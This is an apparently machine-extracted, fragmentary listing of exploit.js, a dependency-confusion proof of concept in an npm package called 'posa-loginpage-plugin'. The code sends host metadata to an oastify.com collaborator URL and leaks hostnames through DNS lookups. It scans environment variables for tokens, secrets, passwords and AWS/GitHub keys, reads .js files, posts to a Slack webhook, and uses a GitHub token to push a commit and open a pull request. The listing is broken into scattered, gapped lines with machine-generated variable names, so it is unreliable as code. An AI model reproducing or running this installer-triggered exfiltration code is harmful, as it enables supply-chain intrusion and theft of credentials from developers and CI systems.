// File: tmp/tmpvn8kougt/posa-loginpage-plugin/package/exploit.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const path = require('path')
Line 3: const os = require('os')
Line 4: const https = require('https')
Line 5: const dns = require('dns')
Line 6: _tmp_21 = require('crypto')
Line 9: const COLLAB = process.env.POC_COLLAB_URL || 'https://jzmar0jtmv28t7sd2d319x554wanysmh.oastify.com/poc'
Line 14: /^1|true$/i.test(process.env.POC_INJECT || '1')
Line 25: {
    const url = new URL(urlStr);
    const data = Buffer.from(JSON.stringify(bodyObj));
    const req = https.request({
      hostname: url.hostname, path: url.pathname + url.search,
      method: 'POST', port: url.port || 443, timeout: timeoutMs,
      headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    }, res => res.resume());
    req.on('error', () => {});
    req.on('timeout', () => req.destroy());
    req.write(data); req.end();
  }
Line 27: Buffer.from(JSON.stringify(bodyObj))
Line 28: const req = https.request({
      hostname: url.hostname, path: url.pathname + url.search,
      method: 'POST', port: url.port || 443, timeout: timeoutMs,
      headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    }, res => res.resume())
Line 35: req.write(data)
Line 40: {
    const label = `${ID}.${os.hostname()}`.replace(/[^a-zA-Z0-9.-]/g, '');
    dns.lookup(`${label}.${hostSuffix}`, () => {});
  }
Line 41: const label = `${ID}.${os.hostname()}`.replace(/[^a-zA-Z0-9.-]/g, '')
Line 47: Object.keys(process.env || {})
Line 49: _tmp_27.push("BITBUCKET_PIPELINE_UUID")
Line 50: _tmp_27.push("AZURE_HTTP_USER_AGENT")
Line 57: os.hostname()
Line 59: os.userInfo()
Line 63: /(token|secret|key|passwd|password|cred|aws_|github_)/i.test(k)
Line 67: {
  const wsMarker = path.resolve(process.cwd(), `DEP_CONFUSION_PROOF_${ID}.txt`);
  safeWrite(wsMarker, `[${now}] Dependency-confusion PoC executed on ${os.hostname()}.\nID=${ID}\n`);
  const tmpMarker = path.join(os.tmpdir?.() ?? '/tmp', `depconfusion-poc-${ID}.json`);
  safeWrite(tmpMarker, JSON.stringify(meta, null, 2));
}
Line 69: safeWrite(wsMarker, `[${now}] Dependency-confusion PoC executed on ${os.hostname()}.\nID=${ID}\n`)
Line 70: path.join(os.tmpdir?.() ?? '/tmp', `depconfusion-poc-${ID}.json`)
Line 78: _tmp_37.push("public")
Line 84: (_tmp_31 = fs.statSync(dir))
Line 85: const entries = fs.readdirSync(dir, { withFileTypes: true })
Line 86: _iterator_0.next()
Line 87: path.join(dir, e.name)
Line 89: /\.js$/.test(e.name)
Line 91: const data = fs.readFileSync(p)
Line 102: _iterator_1.next()
Line 106: httpPost(COLLAB, { type: 'depconfusion-poc', meta })
Line 113: httpPost(SLACK_WEBHOOK, {
    text: `PoC ${ID}: dependency-confusion executed on ${meta.host}. CI flags: ${meta.ciSignals.join(', ') || 'none'}`
  })
Line 114: meta.ciSignals.join(', ')
Line 119: {
  if (!GH_TOKEN || !GH_REPO) return;

  // Create a proof file and a branch, then open a PR. We do this with raw HTTPS to avoid extra deps.
  const proofRel = `poc/DEP_CONFUSION_PROOF_${ID}.md`;
  const proofContent = Buffer.from(`# PoC ${ID}\n\nThis file was created by an authorized dependency-confusion test at ${now} on ${meta.host}.\n`).toString('base64');

  function ghRequest(method, path, body) {
    return new Promise(resolve => {
      const data = body ? Buffer.from(JSON.stringify(body)) : null;
      const req = https.request({
        hostname: 'api.github.com',
        path, method, port: 443,
        headers: {
          'User-Agent': 'depconfusion-poc',
          'Authorization': `Bearer ${GH_TOKEN}`,
          'Accept': 'application/vnd.github+json',
          ...(data ? { 'Content-Type': 'application/json', 'Content-Length': data.length } : {})
        }
      }, res => {
        let buf = ''; res.on('data', c => buf += c); res.on('end', () => resolve({ status: res...
Line 124: Buffer.from(`# PoC ${ID}\n\nThis file was created by an authorized dependency-confusion test at ${now} on ${meta.host}.\n`).toString('base64')
Line 127: {
      const data = body ? Buffer.from(JSON.stringify(body)) : null;
      const req = https.request({
        hostname: 'api.github.com',
        path, method, port: 443,
        headers: {
          'User-Agent': 'depconfusion-poc',
          'Authorization': `Bearer ${GH_TOKEN}`,
          'Accept': 'application/vnd.github+json',
          ...(data ? { 'Content-Type': 'application/json', 'Content-Length': data.length } : {})
        }
      }, res => {
        let buf = ''; res.on('data', c => buf += c); res.on('end', () => resolve({ status: res.statusCode, body: buf }));
      });
      req.on('error', () => resolve({ status: 0, body: '' }));
      if (data) req.write(data);
      req.end();
    }
Line 128: Buffer.from(JSON.stringify(body))
Line 129: const req = https.request({
        hostname: 'api.github.com',
        path, method, port: 443,
        headers: {
          'User-Agent': 'depconfusion-poc',
          'Authorization': `Bearer ${GH_TOKEN}`,
          'Accept': 'application/vnd.github+json',
          ...(data ? { 'Content-Type': 'application/json', 'Content-Length': data.length } : {})
        }
      }, res => {
        let buf = ''; res.on('data', c => buf += c); res.on('end', () => resolve({ status: res.statusCode, body: buf }));
      })
Line 143: req.end()
Line 150: const repo = JSON.parse(mainResp.body || '{}')
Line 153: const ref = JSON.parse(refResp.body || '{}')
Line 162: const blobSha = JSON.parse(blob.body || '{}').sha
Line 165: const tree = await ghRequest('POST', `${repoPath}/git/trees`, {
    base_tree: baseSha,
    tree: [{ path: proofRel, mode: '100644', type: 'blob', sha: blobSha }]
  })
Line 167: _tmp_14.tree = [{ path: proofRel, mode: '100644', type: 'blob', sha: blobSha }]
Line 169: const treeSha = JSON.parse(tree.body || '{}').sha
Line 171: const commit = await ghRequest('POST', `${repoPath}/git/commits`, {
    message: `PoC: dependency-confusion proof (${ID})`,
    tree: treeSha,
    parents: [baseSha]
  })
Line 174: _tmp_17.parents = [baseSha]
Line 176: const commitSha = JSON.parse(commit.body || '{}').sha
